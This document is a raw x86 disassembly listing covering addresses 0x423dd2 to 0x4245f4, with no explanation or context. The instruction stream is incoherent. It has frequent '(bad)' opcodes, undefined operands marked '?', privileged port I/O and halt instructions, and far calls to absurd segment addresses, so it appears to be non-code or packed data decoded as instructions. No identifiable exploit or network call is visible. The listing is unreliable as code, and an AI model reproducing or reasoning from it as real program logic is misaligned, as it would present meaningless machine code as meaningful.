  423dd2:	ins    BYTE PTR es:[edi],dx
  423dd3:	cmp    BYTE PTR [esi+0x204fcb4f],0x7b
  423dda:	outs   dx,DWORD PTR ds:[esi]
  423ddb:	(bad)  [esi+0x6f21d24]
  423de1:	sbb    ch,BYTE PTR [eax+0x1d]
  423de4:	mov    ch,0x4f
  423de6:	jb     0x423e54
  423de8:	dec    ecx
  423de9:	mov    eax,0x18fec18e
  423dee:	ds mov ebp,ds
  423df1:	aad    0x4c
  423df3:	dec    edx
  423df4:	push   0xbcd1b03b
  423df9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423dfa:	loop   0x423dc6
  423dfc:	mov    eax,ds:0x205e2a8a
  423e01:	jge    0x423e7c
  423e03:	push   ecx
  423e04:	or     eax,DWORD PTR [esi-0x223aae38]
  423e0a:	out    0xf1,al
  423e0c:	jecxz  0x423dba
  423e0e:	aaa    
  423e0f:	scas   al,BYTE PTR es:[edi]
  423e10:	sbb    BYTE PTR [eax],cl
  423e12:	hlt    
  423e13:	mov    edi,0x33975db5
  423e18:	sbb    eax,0xfcdcb8d5
  423e1d:	pop    edx
  423e1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e1f:	xchg   esp,eax
  423e20:	rol    DWORD PTR [esp+esi*1+0x4a7f5937],1
  423e27:	int    0x8f
  423e29:	in     eax,dx
  423e2a:	shr    BYTE PTR [esi+0x570e269d],0x31
  423e31:	add    eax,esp
  423e33:	je     0x423e83
  423e35:	jo     0x423e46
  423e37:	sub    eax,DWORD PTR es:[edx+eiz*8-0x54]
  423e3c:	push   ss
  423e3d:	jmp    0x1b0705ed
  423e42:	ret    
  423e43:	sub    al,0x83
  423e45:	mov    WORD PTR [esi-0x9569277],ds
  423e4b:	out    dx,al
  423e4c:	xor    al,0x99
  423e4e:	repnz push ecx
  423e50:	push   eax
  423e51:	pusha  
  423e52:	fcom   QWORD PTR [ecx+eiz*1-0x51]
  423e56:	(bad)  
  423e57:	fcom   QWORD PTR [esi+0x6]
  423e5a:	sub    BYTE PTR [esi-0x54095e6a],ch
  423e60:	icebp  
  423e61:	dec    esp
  423e62:	xchg   esp,eax
  423e63:	mov    BYTE PTR [eax+0x7a7d2347],dl
  423e69:	pop    es
  423e6a:	test   eax,0x461aff0c
  423e6f:	jbe    0x423ec5
  423e71:	fs push ebp
  423e73:	inc    ebp
  423e74:	nop
  423e75:	jl     0x423e34
  423e77:	pop    es
  423e78:	mov    ebx,0x61eca9e3
  423e7d:	adc    DWORD PTR [edx+0x2ccb6ca1],0xe
  423e84:	xchg   ecx,eax
  423e85:	aad    0xc
  423e87:	or     DWORD PTR [edi-0x7f],eax
  423e8a:	mov    esp,0xa406909e
  423e8f:	arpl   cx,cx
  423e91:	xor    DWORD PTR [ebx-0x2b4b8f20],esp
  423e97:	sbb    BYTE PTR [edx+0x107960e4],0x29
  423e9e:	ins    DWORD PTR es:[edi],dx
  423e9f:	out    dx,eax
  423ea0:	std    
  423ea1:	lea    esi,[esi+eax*2]
  423ea4:	sub    BYTE PTR [eax],al
  423ea6:	in     al,0xd7
  423ea8:	push   ebp
  423ea9:	jg     0x423e4e
  423eab:	add    ebp,edx
  423ead:	pop    esi
  423eae:	mov    ebx,0xef8b0a00
  423eb3:	std    
  423eb4:	or     DWORD PTR [edi+eax*2-0x544d763a],esi
  423ebb:	data16 xor BYTE PTR [eax+0x58909558],ah
  423ec2:	(bad)  
  423ec3:	repz rcr BYTE PTR [edx-0x34],cl
  423ec7:	cs xchg ebx,eax
  423ec9:	fcmovbe st,st(3)
  423ecb:	cs into 
  423ecd:	adc    al,0xb6
  423ecf:	shl    DWORD PTR [eax+0x2a],1
  423ed2:	sub    eax,0xda9ea27f
  423ed7:	mov    dh,0x16
  423ed9:	fimul  DWORD PTR [edi+0x3d]
  423edc:	out    dx,al
  423edd:	sbb    ah,dh
  423edf:	push   edi
  423ee0:	or     DWORD PTR [edi+0x11],ecx
  423ee3:	fimul  WORD PTR [eax+0x6b]
  423ee6:	jns    0x423e8b
  423ee8:	or     eax,0x73e15019
  423eed:	aas    
  423eee:	jbe    0x423f2b
  423ef0:	in     al,dx
  423ef1:	mov    ecx,0xca3f8be8
  423ef6:	lock fstp DWORD PTR [edi+0x41]
  423efa:	dec    esp
  423efb:	push   edi
  423efc:	mov    esp,0xa4255d0b
  423f01:	hlt    
  423f02:	sub    BYTE PTR [ecx],dl
  423f04:	sbb    edi,esi
  423f06:	imul   esi,esp,0x6b
  423f09:	push   es
  423f0a:	mov    WORD PTR [esp+edx*2+0x0],?
  423f11:	add    dl,dl
  423f13:	clc    
  423f14:	data16 outs dx,BYTE PTR es:[esi]
  423f17:	mov    esi,0x8c85fcd2
  423f1c:	out    dx,al
  423f1d:	ficom  DWORD PTR [esp+0x6e]
  423f21:	lahf   
  423f22:	and    edi,DWORD PTR [eax+0x4f30001]
  423f28:	add    BYTE PTR [eax],al
  423f2a:	icebp  
  423f2b:	(bad)  
  423f2c:	fnstsw WORD PTR ds:0xbae75b3c
  423f32:	jmp    0x423efe
  423f34:	mov    edi,0x41ee764f
  423f39:	ret    0x69f4
  423f3c:	in     al,dx
  423f3d:	je     0x423eea
  423f3f:	test   al,0xb1
  423f41:	push   es
  423f42:	ins    BYTE PTR es:[edi],dx
  423f43:	push   edx
  423f44:	mov    cl,0x62
  423f46:	push   ebp
  423f47:	jle    0x423f7a
  423f49:	dec    ebx
  423f4a:	cmc    
  423f4b:	push   ebx
  423f4c:	add    ch,al
  423f4e:	xchg   ebp,eax
  423f4f:	rcl    DWORD PTR [ebp+0x4b],0x6f
  423f53:	(bad)  
  423f54:	xchg   edx,eax
  423f55:	mov    ch,0xb7
  423f57:	mov    ebx,0xdfa8cd88
  423f5c:	add    eax,0x851bc747
  423f61:	ror    DWORD PTR [ebx+0x4a1fb8c5],0xc9
  423f68:	retf   
  423f69:	sbb    DWORD PTR [esi],eax
  423f6b:	(bad)  
  423f6c:	adc    dl,BYTE PTR [edx-0x9]
  423f6f:	rcl    DWORD PTR [esi-0xf],cl
  423f72:	(bad)  
  423f73:	lods   al,BYTE PTR ds:[esi]
  423f74:	call   0x2488:0x8101587f
  423f7b:	cmp    dl,BYTE PTR [eax]
  423f7d:	jnp    0x423f9c
  423f7f:	(bad)  
  423f81:	mov    ds:0x83f498ef,al
  423f86:	xor    al,dh
  423f88:	rcr    BYTE PTR [eax+edx*2+0x4f],0x5
  423f8d:	push   eax
  423f8f:	cmp    BYTE PTR [eax],0xbc
  423f92:	(bad)  
  423f93:	pop    ecx
  423f94:	sbb    BYTE PTR [ebp+ecx*2-0x61b23aa6],0x66
  423f9c:	hlt    
  423f9d:	(bad)  
  423f9e:	popf   
  423f9f:	sbb    BYTE PTR [esi],dl
  423fa1:	in     eax,dx
  423fa2:	enter  0xd767,0x87
  423fa6:	cmp    bl,BYTE PTR [ecx-0x6f16389]
  423fac:	lahf   
  423fad:	mov    edi,0x30bc4bb9
  423fb2:	xchg   edi,eax
  423fb3:	shl    cl,cl
  423fb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423fb6:	or     eax,0xdaf0d8c6
  423fbb:	ror    DWORD PTR [eax],1
  423fbd:	bound  eax,QWORD PTR ds:0x17ce92ed
  423fc3:	cwde   
  423fc4:	loope  0x42403b
  423fc6:	cmp    BYTE PTR [esi+0x65323c40],dh
  423fcc:	jp     0x42404b
  423fce:	add    al,0xb1
  423fd0:	push   eax
  423fd1:	je     0x423f97
  423fd3:	call   0x4d6aea95
  423fd8:	pop    eax
  423fd9:	xor    DWORD PTR [ebx],ebp
  423fdb:	rcl    BYTE PTR [ebx+esi*1],cl
  423fde:	mov    bl,BYTE PTR [edx+edi*4]
  423fe1:	bound  esp,QWORD PTR [ecx-0x70]
  423fe4:	pop    esp
  423fe5:	mov    al,0x56
  423fe7:	xchg   esi,eax
  423fe8:	std    
  423fe9:	repz scas al,BYTE PTR es:[edi]
  423feb:	or     DWORD PTR [ecx],esi
  423fed:	mov    ebx,0x88430a02
  423ff2:	call   0x808b:0x4d8a8bb2
  423ff9:	pop    ebx
  423ffa:	fild   QWORD PTR ds:0xa7ed678f
  424000:	xlat   BYTE PTR ds:[ebx]
  424001:	lock jae 0x42403e
  424004:	mov    BYTE PTR [eax-0x1b7e7b50],ch
  42400a:	xlat   BYTE PTR ds:[ebx]
  42400b:	add    DWORD PTR [ebx],eax
  42400d:	jp     0x423fec
  42400f:	mov    ?,WORD PTR [ecx-0x408a8a06]
  424015:	je     0x423faa
  424017:	dec    ebp
  424018:	dec    ecx
  424019:	mov    bh,0xfb
  42401b:	push   eax
  42401c:	cdq    
  42401d:	lahf   
  42401e:	mov    edx,0x5895f1cb
  424023:	imul   eax,DWORD PTR [eax+0xc],0x5e26c9b8
  42402a:	shl    dl,0x77
  42402d:	inc    ebp
  42402e:	aam    0xb0
  424030:	aad    0xcc
  424032:	and    edi,DWORD PTR [ebp-0x24]
  424035:	xchg   ecx,eax
  424036:	mov    edx,0xc36983ba
  42403b:	dec    ecx
  42403c:	dec    edi
  42403d:	dec    esp
  42403e:	ret    0xec8d
  424041:	and    eax,DWORD PTR [edi+0xdd21e4f]
  424047:	out    0x81,al
  424049:	lea    edx,[edx]
  42404b:	push   edx
  42404c:	js     0x42401a
  42404e:	xor    BYTE PTR [ebx+ecx*2+0x50575b26],ah
  424055:	xchg   esi,eax
  424056:	in     eax,dx
  424057:	mov    edx,0xec4addb0
  42405c:	call   0xaae2:0x4144092e
  424063:	pop    ecx
  424064:	add    eax,0xdf203976
  424069:	xor    al,0x49
  42406b:	loop   0x423ffe
  42406d:	sbb    BYTE PTR [eax+0x6a6af85],dl
  424073:	pop    esi
  424074:	out    dx,eax
  424075:	pop    ds
  424076:	xorps  xmm0,xmm7
  424079:	ins    DWORD PTR es:[edi],dx
  42407a:	call   DWORD PTR [ebp+0x38]
  42407d:	mov    al,ds:0x9b5963a7
  424082:	lods   eax,DWORD PTR ds:[esi]
  424083:	pop    ecx
  424084:	jmp    0x1ce2:0xf54e6a0
  42408b:	(bad)  
  42408c:	out    0x2d,eax
  42408e:	push   ebp
  424090:	dec    esi
  424091:	mov    bh,0xaa
  424093:	popa   
  424094:	ret    0x9fe8
  424097:	fwait
  424098:	call   0xc683:0xf6a4d01b
  42409f:	sub    eax,0xf889c91
  4240a4:	push   es
  4240a5:	or     ebx,0x56b9e057
  4240ab:	cld    
  4240ac:	or     edx,eax
  4240ae:	mov    ebx,0xbabb5d5b
  4240b3:	(bad)  
  4240b4:	pushf  
  4240b5:	loop   0x42406e
  4240b7:	or     ecx,DWORD PTR [edi-0x933ba49]
  4240bd:	fsubp  st(3),st
  4240bf:	pop    esi
  4240c0:	sbb    eax,0xf024d7be
  4240c5:	mov    ecx,0xb9793d89
  4240ca:	mov    bl,0xb
  4240cc:	xchg   ecx,eax
  4240cd:	jmp    0x42412d
  4240cf:	call   0x79fe:0xc6553a33
  4240d6:	mov    eax,0xc9301103
  4240db:	mov    gs,edi
  4240dd:	or     esi,esi
  4240df:	je     0x4240fe
  4240e1:	sbb    cl,BYTE PTR [esp+ecx*2-0x1e7e592d]
  4240e8:	fxch   st(6)
  4240ea:	retf   
  4240eb:	stc    
  4240ec:	and    ah,BYTE PTR [edi+0x3]
  4240ef:	jae    0x424107
  4240f1:	in     eax,0x46
  4240f3:	jecxz  0x4240dc
  4240f5:	aad    0xd3
  4240f7:	fs pop eax
  4240f9:	fstp   st(7)
  4240fb:	xor    al,0xf4
  4240fd:	shl    BYTE PTR [ecx],cl
  4240ff:	jae    0x424156
  424101:	sub    eax,0xd65099b2
  424106:	dec    ebx
  424107:	xlat   BYTE PTR ds:[ebx]
  424108:	out    0x3c,eax
  42410a:	inc    edx
  42410b:	ins    BYTE PTR es:[edi],dx
  42410c:	aaa    
  42410d:	retf   
  42410e:	sub    DWORD PTR [ebx+0x5d186574],esp
  424114:	or     DWORD PTR [edi+eax*8],ecx
  424117:	or     edx,DWORD PTR [ebx]
  424119:	push   esi
  42411a:	adc    ah,BYTE PTR [edi]
  42411c:	ja     0x4240d5
  42411e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42411f:	sbb    al,0xf8
  424121:	mov    edi,0xe01d553b
  424126:	retf   0xd6f1
  424129:	xor    BYTE PTR [ebx-0x48],al
  42412c:	imul   ebp,DWORD PTR [edi+0x4a2c5178],0x65
  424133:	in     al,0x38
  424135:	ret    
  424136:	les    eax,FWORD PTR [edi-0x52364656]
  42413c:	call   0x1c2df68b
  424141:	popa   
  424142:	mov    al,ds:0xbd403cfb
  424147:	fs cwde 
  424149:	fcomp  st(5)
  42414b:	std    
  42414c:	or     al,dl
  42414e:	fwait
  42414f:	inc    ebx
  424150:	mov    ds:0x4b3bff07,al
  424155:	mov    bl,0xed
  424157:	bound  esp,QWORD PTR [ecx+ecx*1+0x39]
  42415b:	test   al,0x52
  42415d:	(bad)  
  42415f:	sbb    bh,BYTE PTR [ecx-0x212561ad]
  424165:	cmp    al,0xb4
  424167:	or     BYTE PTR cs:[esp+ebx*4-0x66999600],ch
  42416f:	fdiv   st,st(3)
  424171:	add    DWORD PTR [eax-0x5bc2dfe6],ecx
  424177:	fnstsw WORD PTR [ecx-0x7309c682]
  42417d:	xor    DWORD PTR [esi],ecx
  42417f:	and    DWORD PTR [edx+0x33af2db2],esi
  424185:	jle    0x4241d1
  424187:	fdivp  st(2),st
  424189:	dec    eax
  42418a:	inc    esi
  42418b:	outs   dx,BYTE PTR ds:[esi]
  42418c:	xlat   BYTE PTR ds:[ebx]
  42418d:	and    esp,edx
  42418f:	shl    BYTE PTR [ecx+0x77],1
  424192:	jb     0x424209
  424194:	mov    edi,0x95e42cf3
  424199:	pop    ss
  42419a:	ret    
  42419b:	js     0x42411e
  42419d:	mov    al,0xd7
  42419f:	xchg   edx,eax
  4241a0:	or     eax,0x984a8ddc
  4241a5:	mov    ebp,0x73adaa06
  4241aa:	call   0x371dfbc8
  4241af:	cmp    al,0x1e
  4241b1:	mov    dl,0x15
  4241b3:	cmc    
  4241b4:	pop    ebx
  4241b5:	add    ebp,edx
  4241b7:	xlat   BYTE PTR ds:[ebx]
  4241b8:	(bad)  
  4241b9:	jae    0x42416a
  4241bb:	(bad)  
  4241bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4241bd:	sar    DWORD PTR [edx+eiz*8],cl
  4241c0:	or     al,0xd
  4241c2:	cmp    bh,BYTE PTR [ebx]
  4241c4:	loope  0x424153
  4241c6:	mov    al,0x10
  4241c8:	pop    esi
  4241c9:	in     eax,dx
  4241ca:	call   0x82037234
  4241cf:	xor    BYTE PTR [eax-0x75f55346],bl
  4241d5:	mov    cl,0x9c
  4241d7:	mov    ch,0x5c
  4241d9:	mov    ebx,0xf37e2cb8
  4241de:	mov    ds:0x607ce212,eax
  4241e3:	out    0x71,al
  4241e5:	adc    eax,0x64404af
  4241ea:	fprem  
  4241ec:	div    bl
  4241ee:	sub    DWORD PTR [esi-0x6c1270de],edi
  4241f4:	arpl   WORD PTR [esi],ax
  4241f6:	imul   esi,DWORD PTR [edx],0x42
  4241f9:	xlat   BYTE PTR ds:[ebx]
  4241fa:	ficom  WORD PTR [edx-0x56]
  4241fd:	sub    ah,BYTE PTR [eax+0x5d2b4c1f]
  424203:	inc    ecx
  424204:	loopne 0x424277
  424206:	add    cl,BYTE PTR [ebx]
  424208:	(bad)  [eax-0x199cafa1]
  42420e:	pusha  
  42420f:	mul    BYTE PTR [edx-0x4f3ba3d1]
  424215:	mov    bp,0xe33c
  424219:	and    BYTE PTR [ecx],dl
  42421b:	dec    ecx
  42421c:	mov    ch,0x70
  42421e:	adc    dh,BYTE PTR [ecx-0x36690ccc]
  424224:	aas    
  424225:	sub    DWORD PTR [ecx+0x7d],edx
  424228:	inc    edi
  424229:	stc    
  42422a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42422b:	clc    
  42422c:	xchg   BYTE PTR [ebp-0x9c53564],dh
  424232:	add    DWORD PTR [edx+0x42],0xa5d02e7
  424239:	jmp    0x424219
  42423b:	ins    BYTE PTR es:[edi],dx
  42423c:	addr16 pop ebx
  42423e:	sub    eax,0x5447a960
  424243:	mov    WORD PTR [edi-0x45],?
  424246:	ret    0x532d
  424249:	(bad)  
  42424a:	imul   esp,ebx,0x28656f43
  424250:	xor    ch,BYTE PTR [edx-0x1a3a3177]
  424256:	pop    DWORD PTR [edx]
  424258:	aas    
  424259:	imul   edi,esp,0xf5fed70b
  42425f:	dec    esi
  424260:	(bad)  
  424261:	mov    ecx,0xe5d57f16
  424266:	cmp    ch,bl
  424268:	jae    0x42420a
  42426a:	sub    eax,0x6762ac85
  42426f:	push   edi
  424270:	cdq    
  424271:	adc    edx,ebp
  424273:	arpl   WORD PTR [ecx+0x2e3eb12e],ax
  424279:	xchg   edi,eax
  42427a:	and    cl,BYTE PTR [edx-0x7dcbd445]
  424280:	sub    al,0x35
  424282:	std    
  424283:	in     al,dx
  424284:	jo     0x42426d
  424286:	cmp    al,0x6b
  424288:	idiv   BYTE PTR [esi+0x3b]
  42428b:	mov    ds:0xc12109a9,eax
  424290:	sub    edx,DWORD PTR [ebp+0x40970968]
  424296:	mov    eax,0xec186c80
  42429b:	dec    ebx
  42429c:	adc    DWORD PTR [ecx+0x45],ebp
  42429f:	xchg   edx,eax
  4242a0:	sbb    eax,0x95a5df37
  4242a5:	in     al,0xb4
  4242a7:	rcl    DWORD PTR [edi],0x13
  4242aa:	push   ecx
  4242ab:	ja     0x4242dc
  4242ad:	jns    0x42425d
  4242af:	popa   
  4242b0:	repnz dec edi
  4242b2:	add    al,0xf6
  4242b4:	pop    ebx
  4242b5:	stos   DWORD PTR es:[edi],eax
  4242b6:	arpl   WORD PTR [esi+0x7e],bx
  4242b9:	shl    ecx,cl
  4242bb:	cmp    DWORD PTR [ebp+0x55],0x2db31c87
  4242c2:	shr    DWORD PTR [edi-0x48318315],1
  4242c8:	xor    al,0x69
  4242ca:	xchg   ebp,eax
  4242cb:	jg     0x42425c
  4242cd:	je     0x424346
  4242cf:	xchg   DWORD PTR [edi-0x689c11bb],edi
  4242d5:	sub    DWORD PTR [edi],eax
  4242d7:	daa    
  4242d8:	retf   0x1052
  4242db:	push   ebp
  4242dc:	data16 rcl BYTE PTR [ebp-0x63],1
  4242e0:	pushf  
  4242e1:	mov    eax,0x5c3ab189
  4242e6:	mov    al,ds:0x289a1cae
  4242eb:	out    0xfa,al
  4242ed:	inc    edi
  4242ee:	cmp    al,0x98
  4242f0:	sub    ah,ch
  4242f2:	jmp    0xf348:0x9536ee2c
  4242f9:	lds    edx,FWORD PTR [ebp-0x1d4fdee6]
  4242ff:	shl    BYTE PTR [ecx-0x8a6c605],1
  424305:	push   0x59798607
  42430a:	sbb    ebp,DWORD PTR [edx+0x52f27f3c]
  424310:	std    
  424311:	and    al,0x29
  424313:	cmp    al,0x99
  424315:	test   al,0xc4
  424317:	push   edx
  424318:	cli    
  424319:	cdq    
  42431a:	fucomi st,st(5)
  42431c:	sbb    DWORD PTR [edx+eax*1+0x64],edi
  424320:	ror    BYTE PTR [ebp-0x695e9077],1
  424326:	adc    dh,BYTE PTR [eax-0x67ae34c1]
  42432c:	jl     0x42433f
  42432e:	addr16 xchg edx,eax
  424330:	(bad)  
  424331:	and    ecx,esi
  424333:	inc    BYTE PTR [edi]
  424335:	inc    edi
  424336:	out    dx,al
  424337:	fist   WORD PTR [esi-0x2a25eaa9]
  42433d:	inc    ecx
  42433e:	sbb    bl,dh
  424340:	mov    ebp,0x284ccf19
  424345:	xchg   edx,eax
  424346:	mov    edx,0x4967e206
  42434b:	xor    al,0xfa
  42434d:	mov    DWORD PTR [ecx-0x4d],esi
  424350:	in     al,0x47
  424352:	inc    esp
  424353:	push   ss
  424354:	scas   al,BYTE PTR es:[edi]
  424355:	lea    esi,[eax+esi*2-0x1d]
  424359:	sbb    al,BYTE PTR [edi+0x9]
  42435c:	cmp    DWORD PTR [ecx+eiz*2],esp
  42435f:	test   eax,0xbfc8c97d
  424364:	shl    DWORD PTR [esi+eiz*8-0x16016449],cl
  42436b:	inc    eax
  42436c:	icebp  
  42436d:	mov    BYTE PTR [esi+0x6ec1ddcb],cl
  424373:	(bad)  [ecx+0x30]
  424376:	inc    esi
  424377:	lahf   
  424378:	inc    ecx
  424379:	push   edx
  42437a:	lahf   
  42437b:	mov    ss,WORD PTR [ebx]
  42437d:	xor    al,0xaa
  42437f:	rcl    bl,0x5
  424382:	pusha  
  424383:	fimul  WORD PTR [edx-0x41728592]
  424389:	dec    ebx
  42438a:	test   eax,0x277c2aaa
  42438f:	pop    DWORD PTR [edi]
  424391:	iret   
  424392:	sub    al,0x5
  424394:	inc    edi
  424395:	(bad)  
  424396:	xor    eax,DWORD PTR [edi+esi*2-0x5]
  42439a:	dec    esp
  42439b:	inc    edx
  42439c:	test   eax,0x58c14067
  4243a1:	jmp    0x3d6f:0xb875af67
  4243a8:	xor    eax,0x575ca6c8
  4243ad:	js     0x4243a4
  4243af:	jmp    0x42440e
  4243b1:	push   0xfffffffc
  4243b3:	cmp    ebp,DWORD PTR [esi-0x2e]
  4243b6:	clc    
  4243b7:	or     eax,0xb1457c64
  4243bc:	call   0xdcd58a12
  4243c1:	push   ecx
  4243c2:	call   0x76ea:0xc2811bc5
  4243c9:	pop    ebp
  4243ca:	mov    DWORD PTR ds:0xd67ac979,esi
  4243d0:	adc    DWORD PTR [ecx+eiz*4-0x2cbe5cfe],0xffffffeb
  4243d8:	enter  0x62bf,0x5b
  4243dc:	xchg   al,dh
  4243de:	pop    esp
  4243df:	cdq    
  4243e0:	inc    eax
  4243e1:	popa   
  4243e2:	hlt    
  4243e3:	cmp    ebp,DWORD PTR [eax-0x8]
  4243e6:	mov    esi,0xfdd20947
  4243eb:	xor    DWORD PTR [eax],0x41
  4243ee:	(bad)  
  4243ef:	nop
  4243f0:	jae    0x424418
  4243f2:	dec    ebp
  4243f3:	sub    al,0x36
  4243f5:	imul   edi,DWORD PTR [edx],0xffffffc2
  4243f8:	inc    ecx
  4243f9:	mov    DWORD PTR [edx-0x1a6d8e11],esp
  4243ff:	push   esp
  424400:	jbe    0x424448
  424402:	and    al,BYTE PTR [ebx-0x6fe81e7]
  424408:	adc    eax,0xbeeb75ef
  42440d:	aas    
  42440e:	or     eax,0x53937e1d
  424413:	and    BYTE PTR [ecx+0x4a],ah
  424416:	push   ecx
  424417:	push   edi
  424418:	iret   
  424419:	sub    eax,0x7ed228
  42441e:	add    BYTE PTR [eax],al
  424420:	add    BYTE PTR [eax],al
  424422:	sub    al,0xda
  424424:	iret   
  424425:	cmp    bh,0x95
  424428:	outs   dx,DWORD PTR ds:[esi]
  424429:	(bad)  
  42442a:	jecxz  0x4243f5
  42442c:	push   ds
  42442d:	ins    DWORD PTR es:[edi],dx
  42442e:	pop    eax
  42442f:	iret   
  424430:	xor    BYTE PTR [edx+0x16],bl
  424433:	mov    ebp,0x4f30001
  424438:	add    BYTE PTR [eax],al
  42443a:	vcvtsi2sd xmm3,xmm3,DWORD PTR [esp+ebx*1+0x28]
  424440:	mov    BYTE PTR [ebp+esi*4-0x73f286b5],ah
  424447:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424448:	jb     0x424487
  42444a:	push   cs
  42444b:	mov    ah,0xf0
  42444d:	in     al,0x48
  42444f:	ins    BYTE PTR es:[edi],dx
  424450:	pop    ecx
  424451:	repnz dec edi
  424453:	pop    esp
  424454:	les    edx,FWORD PTR ds:0xb4edc9b4
  42445a:	mov    ecx,0xa5705c8f
  42445f:	cmp    edx,DWORD PTR [ebp+0x3c]
  424462:	pop    ebp
  424463:	push   ebx
  424464:	cmp    DWORD PTR [edx+0x10],edi
  424467:	jecxz  0x42444b
  424469:	scas   eax,DWORD PTR es:[edi]
  42446a:	repnz stos BYTE PTR es:[edi],al
  42446c:	adc    BYTE PTR [ebp-0x70],cl
  42446f:	or     eax,0xecf9bf81
  424474:	mov    cl,0xaf
  424476:	fs enter 0xb0f0,0x5c
  42447b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42447c:	push   esi
  42447d:	stc    
  42447e:	in     al,dx
  42447f:	sbb    ebp,DWORD PTR [edi+0x79]
  424482:	cmp    bh,BYTE PTR [ebp-0x2e6c10ba]
  424488:	in     eax,dx
  424489:	fdiv   st,st(2)
  42448b:	push   esi
  42448c:	mov    bl,dl
  42448e:	sub    al,0x39
  424490:	push   ebp
  424491:	jo     0x4244d3
  424493:	das    
  424494:	int3   
  424495:	cmp    eax,0x32e1c01f
  42449a:	call   0x9038:0xefac71a6
  4244a1:	push   eax
  4244a2:	in     al,0x85
  4244a4:	jns    0x424482
  4244a6:	jae    0x4244c1
  4244a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4244a9:	sub    al,0x5
  4244ab:	inc    esi
  4244ac:	daa    
  4244ad:	xor    al,0x70
  4244af:	aaa    
  4244b0:	mov    esi,0x6bf4c319
  4244b5:	push   edx
  4244b6:	ins    DWORD PTR es:[edi],dx
  4244b7:	aam    0xd
  4244b9:	jnp    0x4244d0
  4244bb:	mov    edi,0xffe2380c
  4244c0:	(bad)  
  4244c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4244c2:	dec    ebp
  4244c3:	daa    
  4244c4:	(bad)  
  4244c5:	xchg   BYTE PTR [esi+esi*4+0x5fa61a29],cl
  4244cc:	mov    ch,BYTE PTR [ebx]
  4244ce:	push   cs
  4244cf:	cmc    
  4244d0:	xor    ecx,esp
  4244d2:	xchg   DWORD PTR [ebx-0x74],ebx
  4244d5:	pop    ecx
  4244d6:	push   0xffffffda
  4244d8:	in     al,0xcd
  4244da:	adc    BYTE PTR [ebx+esi*2],bh
  4244dd:	into   
  4244de:	adc    BYTE PTR [esi+eiz*1-0x236b2362],cl
  4244e5:	inc    edx
  4244e6:	jle    0x424545
  4244e8:	call   0x591c:0x628bce45
  4244ef:	adc    ebx,esi
  4244f1:	jl     0x42449c
  4244f3:	or     al,0x21
  4244f5:	cmp    ecx,DWORD PTR [eax+0x1b4cc047]
  4244fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4244fc:	and    ebx,DWORD PTR [edi+eiz*1]
  4244ff:	pop    ebp
  424500:	test   al,0x8f
  424502:	and    ch,ah
  424504:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424505:	adc    DWORD PTR [edx+0x52],esp
  424508:	pop    es
  424509:	dec    ebx
  42450a:	xchg   esi,eax
  42450b:	sbb    eax,0xf2fdda0f
  424510:	fadd   QWORD PTR [esi-0x45809673]
  424516:	jmp    0x1f0554ba
  42451b:	stos   BYTE PTR es:[edi],al
  42451c:	sahf   
  42451d:	inc    bl
  42451f:	and    ebx,esp
  424521:	popf   
  424522:	enter  0x1301,0xc1
  424526:	sub    ebx,DWORD PTR [edx+esi*4-0x7e718eb8]
  42452d:	out    0x75,eax
  42452f:	pop    ss
  424530:	aad    0xb4
  424532:	out    dx,eax
  424533:	xor    BYTE PTR [ebx+0x4a],0x10
  424537:	push   esp
  424538:	mov    ?,esi
  42453a:	mov    edi,0x3e545ef7
  42453f:	push   ds
  424540:	jne    0x4244f6
  424542:	fisttp QWORD PTR cs:[edx+0x58359b0a]
  424549:	into   
  42454a:	xchg   BYTE PTR [esi+eax*2+0x13],dl
  42454e:	test   BYTE PTR [edx-0x6d],ch
  424551:	sahf   
  424552:	idiv   BYTE PTR [esi]
  424554:	call   0xcbdb:0x5e2ce554
  42455b:	xor    al,al
  42455d:	pop    ebx
  42455e:	les    esi,FWORD PTR [edx+esi*2+0x6c]
  424562:	cli    
  424563:	adc    DWORD PTR [eax+0x7a],0x33
  424567:	(bad)  
  424568:	fldenv [eax-0xdf7210e]
  42456e:	stc    
  42456f:	dec    eax
  424570:	mov    ecx,0xb99292a
  424575:	xor    BYTE PTR [eax+0x473245f1],ch
  42457b:	adc    DWORD PTR [eax+eax*8-0x1f],0x16a79128
  424583:	aaa    
  424584:	adc    al,0x8c
  424586:	call   0x9694:0x6bbfd8b1
  42458d:	lahf   
  42458e:	int3   
  42458f:	mov    ch,BYTE PTR [ebx-0x3f]
  424592:	mov    dh,0x13
  424594:	jp     0x424534
  424596:	adc    eax,0xc8f637ad
  42459b:	inc    eax
  42459c:	pop    ds
  42459d:	cli    
  42459e:	cmp    eax,0x613d62e8
  4245a3:	les    eax,FWORD PTR [ebx+0x48]
  4245a6:	xor    DWORD PTR [esi-0x3],eax
  4245a9:	xor    esi,DWORD PTR ds:0xdd5c040b
  4245af:	inc    ecx
  4245b0:	sbb    BYTE PTR [edx-0x5ddcbece],cl
  4245b6:	push   0xadea70c2
  4245bb:	push   ebx
  4245bc:	scas   al,BYTE PTR es:[edi]
  4245bd:	std    
  4245be:	mov    fs,WORD PTR [ecx-0x489aad43]
  4245c4:	test   al,0xc5
  4245c6:	mov    bl,0x29
  4245c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4245c9:	push   edx
  4245ca:	out    dx,al
  4245cb:	jmp    FWORD PTR [ecx]
  4245cd:	js     0x4245ae
  4245cf:	mov    ds:0xbd07122f,eax
  4245d4:	mov    BYTE PTR [edx+0x2e5c14b9],ch
  4245da:	js     0x4245e6
  4245dc:	pop    eax
  4245dd:	mov    fs,WORD PTR [ecx+0x44]
  4245e0:	sub    eax,0xc1eeb945
  4245e5:	mov    eax,0x62ce82b3
  4245ea:	xchg   edx,eax
  4245eb:	fs mov bl,0xe
  4245ee:	setnp  BYTE PTR [edx+0x2e]
  4245f2:	loop   0x424617
  4245f4:	lock mov ds:0x9281c974,al
